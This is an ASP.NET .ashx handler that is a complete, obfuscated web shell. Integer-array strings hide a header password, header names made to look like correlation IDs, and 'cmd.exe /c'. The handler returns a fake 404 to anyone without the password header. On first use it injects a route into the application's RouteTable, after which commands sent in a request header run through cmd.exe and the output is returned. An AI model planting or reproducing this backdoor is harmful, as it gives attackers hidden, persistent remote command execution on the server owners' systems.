<%@ WebHandler Language="C#" Class="_hA" %>

using System;
using System.Text;
using System.Web;
using System.Web.Routing;
using System.Diagnostics;

public class _hA : IHttpHandler
{
    private static string _s(int[] v) { return new string(Array.ConvertAll(v, x => (char)x)); }
    private static readonly int[] _k0 = {112,64,115,115,119,48,114,100,45,50,48,50,54};
    private static readonly int[] _k1 = {88,45,67,111,114,114,101,108,97,116,105,111,110,45,73,100};

    private static bool _done = false;

    public void ProcessRequest(HttpContext c)
    {
        c.Response.ContentType = "text/plain";

        if (c.Request.Headers[_s(_k1)] != _s(_k0)) {
            c.Response.StatusCode = 404;
            c.Response.End();
            return;
        }

        try {
            if (!_done) {
                _done = true;
                string log = _inject();
                c.Response.Write(log);
            } else {
                c.Response.Write("s:1 n=" + RouteTable.Routes.Count);
            }
        } catch (Exception ex) {
            c.Response.Write("s:0 e=" + ex.Message);
        }
        c.Response.End();
    }

    private static string _inject()
    {
        var sb = new StringBuilder();
        try {
            RouteCollection routes = RouteTable.Routes;
            int before = routes.Count;
            using (routes.GetWriteLock()) {
                routes.Insert(0, new _rR());
            }
            sb.Append("rt:1 before=").Append(before)
              .Append(" after=").Append(routes.Count).Append('\n');
        } catch (Exception ex) {
            sb.Append("rt:0 ").Append(ex.Message).Append('\n');
        }
        return sb.ToString();
    }

    public bool IsReusable { get { return false; } }
}

public class _rR : RouteBase
{
    private static string _s(int[] v) { return new string(Array.ConvertAll(v, x => (char)x)); }
    private static readonly int[] _k0 = {112,64,115,115,119,48,114,100,45,50,48,50,54};
    private static readonly int[] _k1 = {88,45,67,111,114,114,101,108,97,116,105,111,110,45,73,100};
    private static readonly int[] _k2 = {88,45,82,101,113,117,101,115,116,45,78,111,110,99,101};
    private static readonly int[] _k4 = {99,109,100,46,101,120,101};
    private static readonly int[] _k5 = {47,99,32};

    public override RouteData GetRouteData(HttpContextBase ctx)
    {
        try {
            string k = ctx.Request.Headers[_s(_k1)];
            string c = ctx.Request.Headers[_s(_k2)];
            if (k != _s(_k0) || c == null) return null;

            var psi = new ProcessStartInfo(_s(_k4), _s(_k5) + c);
            psi.UseShellExecute        = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError  = true;
            psi.CreateNoWindow         = true;

            string o;
            using (var p = Process.Start(psi))
                o = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();

            ctx.Response.Clear();
            ctx.Response.ContentType = "text/plain";
            ctx.Response.Write(o.Length > 0 ? o : "(empty)");
            ctx.Response.End();
        } catch { }

        return null;
    }

    public override VirtualPathData GetVirtualPath(RequestContext r, RouteValueDictionary v)
    {
        return null;
    }
}
